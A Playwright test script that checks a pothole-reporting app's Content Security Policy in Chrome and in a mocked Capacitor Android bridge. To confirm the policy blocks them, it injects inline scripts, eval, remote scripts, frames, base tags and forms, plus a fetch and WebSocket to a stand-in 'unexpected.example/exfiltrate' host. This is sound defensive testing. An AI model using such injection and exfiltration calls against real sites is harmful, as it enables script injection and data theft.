/* SEC-009 real-browser enforcement; uses the existing tests/serve_app.py server.
 * Requires Playwright on NODE_PATH (or installed locally). POTHOLE_TEST_APP and
 * POTHOLE_TEST_BROWSER_CHANNEL select the existing server and browser installation.
 * No CSP bypass or disabled-web-security flags; all external traffic is mocked.
 */
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { chromium } = require('playwright');
const ROOT = path.resolve(__dirname, '..');
const APP = process.env.POTHOLE_TEST_APP || 'http://127.0.0.1:8765/';
const channel = process.env.POTHOLE_TEST_BROWSER_CHANNEL || 'chrome';
const PIXEL = 'R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=';
const requirements = [
  'https://api.openai.com/v1/models?limit=1',
  'https://nominatim.openstreetmap.org/reverse?lat=12&lon=77',
];

async function prepare(browser) {
  const context = await browser.newContext({ viewport: { width: 390, height: 844 }, bypassCSP: false });
  const seen = [];
  await context.addInitScript(() => {
    if (window !== window.top) return;
    window.__sec009Violations = [];
    document.addEventListener('securitypolicyviolation', e => {
      window.__sec009Violations.push({ directive: e.effectiveDirective, blocked: e.blockedURI });
    });
    window.alert = () => {};
    localStorage.setItem('initial_setup_complete', '1');
    localStorage.setItem('privacy_consent_version', '1');
  });
  await context.route('**/*', async route => {
    const url = new URL(route.request().url());
    if (url.pathname === '/sec009-eval-probe.js') {
      return route.fulfill({ contentType: 'text/javascript', body:
        'try { eval("window.__sec009EvalExecuted=true"); } catch(e) { window.__sec009EvalBlocked=e instanceof EvalError; }' });
    }
    if (url.hostname === 'unexpected.example') {
      seen.push(url.href);
      return route.fulfill({ contentType: 'text/javascript', body: 'window.__sec009RemoteExecuted=true' });
    }
    if (url.origin === new URL(APP).origin) return route.continue();
    seen.push(url.href);
    if (url.hostname === 'tile.openstreetmap.org') {
      return route.fulfill({ contentType: 'image/gif', body: Buffer.from(PIXEL, 'base64') });
    }
    return route.fulfill({ contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: '{}' });
  });
  return { context, seen };
}

async function browserSurface(browser, suffix) {
  const { context, seen } = await prepare(browser);
  try {
    const page = await context.newPage();
    const errors = [];
    page.on('pageerror', e => errors.push(e.message));
    await page.goto(new URL(suffix, APP).href);
    await page.waitForFunction(() => typeof loadReports === 'function' && window.StandaloneAPI && window.CredentialBroker);
    await page.evaluate(() => nativeInitialRestorePromise);
    assert.equal(await page.evaluate(() => window.__sec009Violations.length), 0, 'normal startup violates CSP');
    assert.equal(await page.evaluate(() => getComputedStyle(document.body).backgroundColor), 'rgb(17, 18, 20)');
    assert.equal(await page.evaluate(() => typeof L.map), 'function', 'local Leaflet script blocked');
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector('#gearBtn')).flexGrow), '0');
    await page.evaluate(() => openSettings());
    assert.equal(await page.locator('#settings').isVisible(), true);
    await page.evaluate(() => { document.getElementById('nativePreviewSlot').style.height = '355px'; });
    assert.equal(await page.evaluate(() => document.getElementById('nativePreviewSlot').style.height), '355px');

    const allowed = await page.evaluate(async urls => {
      const fetched = [];
      for (const url of urls) fetched.push((await fetch(url)).ok);
      const source = 'data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=';
      const blob = await (await fetch(source)).blob();
      const objectUrl = URL.createObjectURL(blob);
      fetched.push((await fetch(objectUrl)).ok);
      const images = await Promise.all([source, objectUrl, 'https://tile.openstreetmap.org/0/0/0.png'].map(src => new Promise(resolve => {
        const img = new Image(); img.onload = () => resolve(img.naturalWidth > 0); img.onerror = () => resolve(false); img.src = src;
      })));
      URL.revokeObjectURL(objectUrl);
      return { fetched, images };
    }, requirements);
    assert.ok(allowed.fetched.every(Boolean), 'legitimate API/photo fetch blocked');
    assert.ok(allowed.images.every(Boolean), 'legitimate photo/map image blocked');
    const mediaAllowed = await page.evaluate(async () => {
      // Chrome supplies synthetic camera frames through the explicit fake-device
      // launch flag; no real camera/device is accessed and no frame is cropped.
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const live = document.createElement('video'); live.muted = true; live.srcObject = stream;
      await live.play();
      const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
      const chunks = [];
      recorder.ondataavailable = e => chunks.push(e.data);
      const stopped = new Promise(resolve => { recorder.onstop = resolve; });
      recorder.start();
      await new Promise(resolve => setTimeout(resolve, 600));
      recorder.stop(); await stopped; live.pause(); stream.getTracks().forEach(t => t.stop());
      const recording = new Blob(chunks, { type: 'video/webm' });
      const url = URL.createObjectURL(recording);
      const clip = document.createElement('video');
      const loaded = await new Promise(resolve => { clip.onloadeddata = () => resolve(clip.videoWidth > 0); clip.onerror = () => resolve(false); clip.src = url; });
      URL.revokeObjectURL(url);
      return { loaded, size: recording.size, dimensions: [clip.videoWidth, clip.videoHeight], error: clip.error?.message, violations: window.__sec009Violations };
    });
    assert.equal(mediaAllowed.loaded, true, `live preview or blob video loading failed: ${JSON.stringify(mediaAllowed)}`);
    assert.equal(await page.evaluate(() => window.__sec009Violations.length), 0, 'legitimate resources violate CSP');

    // An allowed local resource runs the eval probe; automation evaluate itself is
    // deliberately not used to prove unsafe-eval blocking.
    await page.evaluate(() => new Promise((resolve, reject) => {
      const script = document.createElement('script'); script.src = '/sec009-eval-probe.js';
      script.onload = resolve; script.onerror = reject; document.head.append(script);
    }));
    assert.equal(await page.evaluate(() => window.__sec009EvalBlocked), true);
    assert.equal(await page.evaluate(() => window.__sec009EvalExecuted), undefined);
    const denied = await page.evaluate(async () => {
      const inline = document.createElement('script'); inline.textContent = 'window.__sec009InlineExecuted=true'; document.body.append(inline);
      const handler = document.createElement('button'); handler.setAttribute('onclick', 'window.__sec009EventExecuted=true'); document.body.append(handler); handler.click();
      const remote = document.createElement('script'); remote.src = 'https://unexpected.example/injected.js'; document.head.append(remote);
      const frame = document.createElement('iframe'); frame.src = 'https://unexpected.example/frame'; document.body.append(frame);
      const object = document.createElement('object'); object.data = 'https://unexpected.example/object'; document.body.append(object);
      const img = new Image(); img.src = 'https://unexpected.example/pixel'; document.body.append(img);
      const base = document.createElement('base'); base.href = 'https://unexpected.example/'; document.head.append(base);
      const style = document.createElement('style'); style.textContent = 'body { --sec009-untrusted: injected; }'; document.head.append(style);
      let connectionBlocked = false;
      try { await fetch('https://unexpected.example/exfiltrate'); } catch { connectionBlocked = true; }
      let socketBlocked = false;
      await new Promise(resolve => {
        try { const ws = new WebSocket('wss://unexpected.example/socket'); ws.onerror = () => { socketBlocked = true; resolve(); }; ws.onopen = () => { ws.close(); resolve(); }; }
        catch { socketBlocked = true; resolve(); }
      });
      return { connectionBlocked, socketBlocked, base: document.baseURI };
    });
    assert.equal(denied.connectionBlocked, true);
    assert.equal(denied.socketBlocked, true);
    assert.equal(denied.base, page.url());
    await page.evaluate(() => { const form = document.createElement('form'); form.action = 'https://unexpected.example/submit'; document.body.append(form); form.submit(); });
    await page.waitForFunction(() => ['script-src-elem', 'script-src-attr', 'object-src', 'frame-src', 'img-src', 'base-uri', 'style-src-elem', 'connect-src', 'form-action']
      .every(d => window.__sec009Violations.some(v => v.directive === d)));
    for (const marker of ['Inline', 'Event', 'Remote']) {
      assert.equal(await page.evaluate(m => window[`__sec009${m}Executed`], marker), undefined);
    }
    assert.equal(await page.evaluate(() => getComputedStyle(document.body).getPropertyValue('--sec009-untrusted')), '');
    assert.equal(seen.some(u => new URL(u).hostname === 'unexpected.example'), false, 'CSP allowed unexpected traffic');
    assert.deepEqual(errors, [], 'application JavaScript exception');
    console.log(`PASS ${suffix}: startup/UI, local assets, exact inline hashes, required mocked connections, photo/map images, live/blob video, inline/event/eval/remote-script blocking, frame/object/image/base/form/style/network blocking`);
  } finally { await context.close(); }
}

async function bridgeModel(browser, fallback) {
  const { context } = await prepare(browser);
  try {
    const entry = fs.readFileSync(path.join(ROOT, 'android-app/www/index.html'), 'utf8');
    const csp = entry.match(/<meta http-equiv="Content-Security-Policy"[^>]+>/)[0];
    const runtime = fs.readFileSync(path.join(ROOT, 'android-app/node_modules/@capacitor/android/capacitor/src/main/assets/native-bridge.js'), 'utf8');
    const nativePrelude = `window.WEBVIEW_SERVER_URL='https://localhost';window.Capacitor={};window.__sec009Calls=[];
      window.CapacitorHttpAndroidInterface={isEnabled:()=>true};
      window.androidBridge={postMessage(raw){const call=JSON.parse(raw);window.__sec009Calls.push(call);
        setTimeout(()=>window.Capacitor.fromNative({callbackId:call.callbackId,pluginId:call.pluginId,methodName:call.methodName,success:true,data:{pong:true}}),0);}};`;
    const injected = nativePrelude + runtime;
    // Exact pinned Java fallback position: immediately after the literal <head>,
    // before the meta. Document-start mode models WebView's native script API.
    const html = `<html><head>${fallback ? `<script>${injected}</script>` : ''}<meta charset="utf-8">${csp}</head><body></body></html>`;
    if (!fallback) await context.addInitScript({ content: injected });
    await context.route('https://localhost/**', async route => {
      const pathname = new URL(route.request().url()).pathname;
      if (pathname === '/') return route.fulfill({ contentType: 'text/html', body: html });
      if (pathname === '/cordova.js') return route.fulfill({ contentType: 'text/javascript', body: fs.readFileSync(path.join(ROOT, 'android-app/android/app/src/main/assets/public/cordova.js')) });
      if (pathname.startsWith('/_capacitor_')) return route.fulfill({ contentType: 'image/gif', body: Buffer.from(PIXEL, 'base64') });
      return route.abort();
    });
    const page = await context.newPage();
    await page.goto('https://localhost/');
    assert.equal(await page.evaluate(() => Capacitor.isNativePlatform() && Capacitor.getPlatform() === 'android'), true);
    assert.deepEqual(await page.evaluate(() => Capacitor.nativePromise('SEC009Probe', 'ping', {})), { pong: true });
    const assets = await page.evaluate(async () => {
      await new Promise((resolve, reject) => { const s = document.createElement('script'); s.src = '/cordova.js'; s.onload = resolve; s.onerror = reject; document.head.append(s); });
      return Promise.all([
        '/_capacitor_file_/photo.jpg', '/_capacitor_content_/media/photo',
        '/_capacitor_http_interceptor_?u=https%3A%2F%2Fnominatim.openstreetmap.org%2Freverse%3Flat%3D12%26lon%3D77'
      ].map(async url => (await CapacitorWebFetch(url)).ok));
    });
    assert.ok(assets.every(Boolean), 'same-origin native resource or GET proxy blocked');
    assert.equal(await page.evaluate(() => window.__sec009Violations.length), 0);
    await page.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__sec009LateInline=true'; document.body.append(s); });
    await page.waitForFunction(() => window.__sec009Violations.some(v => v.directive === 'script-src-elem'));
    assert.equal(await page.evaluate(() => window.__sec009LateInline), undefined);
    console.log(`PASS native ${fallback ? 'HTML fallback' : 'document-start'} model: actual pinned Capacitor JS, mocked bridge request/response, local Cordova, file/content/GET proxy access, later inline injection blocked`);
  } finally { await context.close(); }
}

(async () => {
  const browser = await chromium.launch({ headless: true,
    args: ['--use-fake-device-for-media-stream', '--use-fake-ui-for-media-stream'],
    ...(channel === 'chromium' ? {} : { channel }) });
  try {
    console.log(`Chrome ${browser.version()}; CSP enforcement enabled; external responses mocked`);
    await browserSurface(browser, '/');
    await browserSurface(browser, '/web-app/');
    await bridgeModel(browser, false);
    await bridgeModel(browser, true);
  } finally { await browser.close(); }
})().catch(error => { console.error(error); process.exitCode = 1; });
